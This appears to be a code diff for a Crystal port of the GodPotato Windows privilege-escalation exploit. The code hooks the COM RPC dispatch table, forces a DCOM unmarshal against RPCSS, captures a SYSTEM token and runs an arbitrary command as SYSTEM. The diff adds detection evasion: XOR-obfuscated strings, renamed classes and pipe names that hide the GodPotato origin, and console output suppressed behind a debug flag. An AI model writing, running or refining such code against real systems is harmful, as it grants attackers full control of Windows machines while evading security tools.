@@ -1,12 +1,28 @@
 require "option_parser"
 
+# ─────────────── Config ─────────────────────────────────
+module Config
+  @@debug = false
+  def self.debug=(v : Bool); @@debug = v; end
+  def self.debug? : Bool; @@debug; end
+end
+
+def dbg(msg : String)
+  puts msg if Config.debug?
+end
+
+# ─────────────── Compile-time string obfuscation ────────
+macro obf(str)
+  {% key = 0x5A %}
+  begin
+    %enc = Bytes[{% for c in str.chars %}{{c.ord ^ key}}_u8, {% end %}]
+    %buf = Bytes.new(%enc.size)
+    %enc.each_with_index { |b, i| %buf[i] = b ^ 0x5A_u8 }
+    String.new(%buf)
+  end
+end
+
 # ─────────────── Lib blocks ─────────────────────────────
-# Extend LibC with Win32 functions not in Crystal's stdlib.
-# DO NOT redeclare: ReadFile, WriteFile, CreateFileW, LocalFree,
-# ConvertSidToStringSidW, CloseHandle, GetLastError, SetLastError,
-# GetCurrentProcess, GetCurrentProcessId, GetCurrentThread,
-# DuplicateHandle, OpenProcess, CreatePipe, SetHandleInformation,
-# VirtualProtect — those are in Crystal's stdlib.
 lib LibC
   fun GetModuleHandleW(name : UInt16*) : Void*
   fun GetCurrentProcess() : Void*
@@ -566,6 +582,7 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
   last_pid = 0_u64
   proc_handle = Pointer(Void).null
   found_token : Pointer(Void)? = nil
+  system_sid = obf("S-1-5-18")
 
   num_handles.times do |i|
     addr = buf.address + entry_offset + i * entry_size
@@ -596,7 +613,7 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
       0_u32, 0, DUPLICATE_SAME_ACCESS) == 0
 
     sid = get_token_sid(dup_token)
-    unless sid == "S-1-5-18"
+    unless sid == system_sid
       LibC.CloseHandle(dup_token)
       next
     end
@@ -637,7 +654,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   stdout_write = Pointer(Void).null
   if LibC.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
       pointerof(sa).as(Pointer(Void)), 8196_u32) == 0
-    puts "[!] CreatePipe failed: #{LibC.GetLastError}"
+    dbg "[!] CreatePipe failed: #{LibC.GetLastError}"
     return
   end
 
@@ -676,7 +693,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   LibC.CloseHandle(primary_token) if has_primary
 
   if created
-    puts "[*] process start with pid #{pi.dw_process_id}"
+    dbg "[*] process start with pid #{pi.dw_process_id}"
     LibC.CloseHandle(stdout_write)
     stdout_write = Pointer(Void).null
 
@@ -700,7 +717,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
     LibC.CloseHandle(pi.h_process)
     LibC.CloseHandle(pi.h_thread)
   else
-    puts "[!] CreateProcess failed. Error: #{LibC.GetLastError}"
+    dbg "[!] CreateProcess failed. Error: #{LibC.GetLastError}"
   end
 
   LibC.CloseHandle(stdout_write) unless stdout_write.null?
@@ -717,7 +734,7 @@ module HookState
   end
 
   def self.hook_impl(pp_bindings : Pointer(Void)) : Int32
-    endpoints = [@@client_pipe, "ncacn_ip_tcp:0"]
+    endpoints = [@@client_pipe, obf("ncacn_ip_tcp:0")]
     entries_size = 3
     endpoints.each { |ep| entries_size += ep.size + 1 }
 
@@ -771,13 +788,13 @@ end
 
 # ─────────────── Pipe Server Thread ─────────────────────
 module PipeServerBridge
-  @@ctx : GodPotatoContext? = nil
+  @@ctx : MyContext? = nil
 
-  def self.ctx=(value : GodPotatoContext?)
+  def self.ctx=(value : MyContext?)
     @@ctx = value
   end
 
-  def self.ctx : GodPotatoContext?
+  def self.ctx : MyContext?
     @@ctx
   end
 end
@@ -796,8 +813,8 @@ PIPE_SERVER_THREAD_PROC = ->(param : Pointer(Void)) : UInt32 {
 }
 
 
-# ─────────────── GodPotatoContext ───────────────────────
-class GodPotatoContext
+# ─────────────── MyContext ──────────────────────────────
+class MyContext
   getter combase_module : UInt64 = 0_u64
   getter dispatch_table_ptr : UInt64 = 0_u64
   getter use_protseq_function_ptr : UInt64 = 0_u64
@@ -814,9 +831,9 @@ class GodPotatoContext
   @pipe_name : String
   @log = [] of String
 
-  def initialize(@pipe_name = "GodPotato")
-    @server_pipe = "\\\\.\\pipe\\#{@pipe_name}\\pipe\\epmapper"
-    HookState.client_pipe = "ncacn_np:localhost/pipe/#{@pipe_name}[\\pipe\\epmapper]"
+  def initialize(@pipe_name = "Crystal")
+    @server_pipe = obf("\\\\.\\pipe\\") + @pipe_name + obf("\\pipe\\epmapper")
+    HookState.client_pipe = obf("ncacn_np:localhost/pipe/") + @pipe_name + obf("[\\pipe\\epmapper]")
 
     init_context
 
@@ -826,7 +843,7 @@ class GodPotatoContext
   end
 
   private def init_context
-    combase_name = "combase.dll".to_utf16
+    combase_name = obf("combase.dll").to_utf16
     h_combase = LibC.GetModuleHandleW(combase_name.to_unsafe)
     return if h_combase.null?
 
@@ -891,7 +908,7 @@ class GodPotatoContext
     Pointer(Pointer(Void)).new(@dispatch_table_ptr).value = hook_ptr
 
     @is_hooked = true
-    puts "[*] HookRPC"
+    dbg "[*] HookRPC"
   end
 
   private def log(msg : String)
@@ -899,7 +916,7 @@ class GodPotatoContext
   end
 
   def run_pipe_server
-    sddl = "D:(A;OICI;GA;;;WD)".to_utf16
+    sddl = obf("D:(A;OICI;GA;;;WD)").to_utf16
     sec_desc = Pointer(Void).null
     sec_desc_size = 0_u32
     LibC.ConvertStringSecurityDescriptorToSecurityDescriptorW(
@@ -976,7 +993,7 @@ class GodPotatoContext
       PIPE_SERVER_THREAD_PROC,
       Pointer(Void).null,
       0_u32, pointerof(tid))
-    puts "[*] Start PipeServer"
+    dbg "[*] Start PipeServer"
   end
 
   def join_pipe_thread
@@ -984,7 +1001,9 @@ class GodPotatoContext
       LibC.WaitForSingleObject(@thread_handle, INFINITE_WAIT)
       LibC.CloseHandle(@thread_handle)
     end
-    @log.each { |msg| puts msg }
+    if Config.debug?
+      @log.each { |msg| puts msg }
+    end
     @log.clear
   end
 
@@ -1052,18 +1071,18 @@ def get_local_objref : ObjRef
   ObjRef.parse(data)
 end
 
-def trigger_dcom(ctx : GodPotatoContext)
+def trigger_dcom(ctx : MyContext)
   tmp_objref = get_local_objref
 
   guid_hex = tmp_objref.guid.hexstring
   ipid_hex = tmp_objref.standard_objref.ipid.hexstring
-  puts "[*] DCOM obj GUID: #{guid_hex[0, 8]}-#{guid_hex[8, 4]}-#{guid_hex[12, 4]}-#{guid_hex[16, 4]}-#{guid_hex[20, 12]}"
-  puts "[*] DCOM obj IPID: #{ipid_hex[0, 8]}-#{ipid_hex[8, 4]}-#{ipid_hex[12, 4]}-#{ipid_hex[16, 4]}-#{ipid_hex[20, 12]}"
-  puts "[*] DCOM obj OXID: 0x#{tmp_objref.standard_objref.oxid.to_s(16)}"
-  puts "[*] DCOM obj OID: 0x#{tmp_objref.standard_objref.oid.to_s(16)}"
+  dbg "[*] DCOM obj GUID: #{guid_hex[0, 8]}-#{guid_hex[8, 4]}-#{guid_hex[12, 4]}-#{guid_hex[16, 4]}-#{guid_hex[20, 12]}"
+  dbg "[*] DCOM obj IPID: #{ipid_hex[0, 8]}-#{ipid_hex[8, 4]}-#{ipid_hex[12, 4]}-#{ipid_hex[16, 4]}-#{ipid_hex[20, 12]}"
+  dbg "[*] DCOM obj OXID: 0x#{tmp_objref.standard_objref.oxid.to_s(16)}"
+  dbg "[*] DCOM obj OID: 0x#{tmp_objref.standard_objref.oid.to_s(16)}"
 
   crafted_dsa = DualStringArray.new(
-    StringBinding.new(EPM_PROTOCOL_TCP, "127.0.0.1"),
+    StringBinding.new(EPM_PROTOCOL_TCP, obf("127.0.0.1")),
     SecurityBinding.new(0x0a_u16, 0xffff_u16))
 
   crafted_objref = ObjRef.new(
@@ -1075,7 +1094,7 @@ def trigger_dcom(ctx : GodPotatoContext)
       tmp_objref.standard_objref.ipid.dup))
 
   data = crafted_objref.get_bytes(crafted_dsa)
-  puts "[*] Marshal Object bytes len: #{data.size}"
+  dbg "[*] Marshal Object bytes len: #{data.size}"
 
   hglobal = LibC.GlobalAlloc(0x0002_u32, data.size.to_u64)
   raise "GlobalAlloc failed for unmarshal" if hglobal.null?
@@ -1089,22 +1108,23 @@ def trigger_dcom(ctx : GodPotatoContext)
 
   ppv = Pointer(Void).null
   iid = IID_IUNKNOWN.dup
-  puts "[*] UnMarshal Object"
-  puts "[*] Trigger RPCSS"
+  dbg "[*] UnMarshal Object"
+  dbg "[*] Trigger RPCSS"
   hr = Ole32.CoUnmarshalInterface(stream, iid.to_unsafe.as(Pointer(Void)), pointerof(ppv))
-  puts "[*] UnmarshalObject: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
+  dbg "[*] UnmarshalObject: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
 end
 
 
 # ─────────────── Main ───────────────────────────────────
 def main
   command = ""
-  pipe_name = "GodPotato"
+  pipe_name = "Crystal"
 
   OptionParser.parse do |parser|
-    parser.banner = "Usage: CrystalPotato.exe [options]"
-    parser.on("-c CMD", "--cmd=CMD", "Command to execute as SYSTEM") { |c| command = c }
-    parser.on("-p NAME", "--pipe=NAME", "Custom pipe name (default: GodPotato)") { |p| pipe_name = p }
+    parser.banner = "Usage: main.exe [options]"
+    parser.on("-c CMD", "--cmd=CMD", "Command") { |c| command = c }
+    parser.on("-p NAME", "--pipe=NAME", "Custom pipe name") { |p| pipe_name = p }
+    parser.on("-d", "--debug", "Verbose output") { Config.debug = true }
     parser.on("-h", "--help", "Show help") { puts parser; exit }
   end
 
@@ -1113,21 +1133,19 @@ def main
     exit(1)
   end
 
-  puts "CrystalPotato - a GodPotato port"
-
   hr = Ole32.CoInitializeEx(Pointer(Void).null, 0_u32)
   if hr < 0
-    puts "[!] CoInitializeEx failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
+    dbg "[!] CoInitializeEx failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
     return
   end
 
   begin
-    ctx = GodPotatoContext.new(pipe_name)
+    ctx = MyContext.new(pipe_name)
 
-    puts "[*] CombaseModule: 0x#{ctx.combase_module.to_s(16)}"
-    puts "[*] DispatchTable: 0x#{ctx.dispatch_table_ptr.to_s(16)}"
-    puts "[*] UseProtseqFunction: 0x#{ctx.use_protseq_function_ptr.to_s(16)}"
-    puts "[*] UseProtseqFunctionParamCount: #{ctx.use_protseq_param_count}"
+    dbg "[*] CombaseModule: 0x#{ctx.combase_module.to_s(16)}"
+    dbg "[*] DispatchTable: 0x#{ctx.dispatch_table_ptr.to_s(16)}"
+    dbg "[*] UseProtseqFunction: 0x#{ctx.use_protseq_function_ptr.to_s(16)}"
+    dbg "[*] UseProtseqFunctionParamCount: #{ctx.use_protseq_param_count}"
 
     ctx.hook_rpc
     ctx.start
@@ -1137,23 +1155,23 @@ def main
     begin
       trigger_dcom(ctx)
     rescue ex
-      puts "[!] Trigger error: #{ex.message}" unless ex.message == "Arithmetic overflow"
+      dbg "[!] Trigger error: #{ex.message}" unless ex.message == "Arithmetic overflow"
     end
 
     ctx.join_pipe_thread
 
     system_token = ctx.get_token
     if system_token
-      puts "[*] CurrentUser: NT AUTHORITY\\SYSTEM"
+      dbg "[*] CurrentUser: NT AUTHORITY\\SYSTEM"
       create_process_read_output(system_token, command)
     else
-      puts "[!] Failed to impersonate security context token"
+      dbg "[!] Failed to impersonate security context token"
     end
 
     ctx.restore
     ctx.stop
   rescue ex
-    puts "[!] #{ex.message}"
+    dbg "[!] #{ex.message}"
   end
 
   Ole32.CoUninitialize
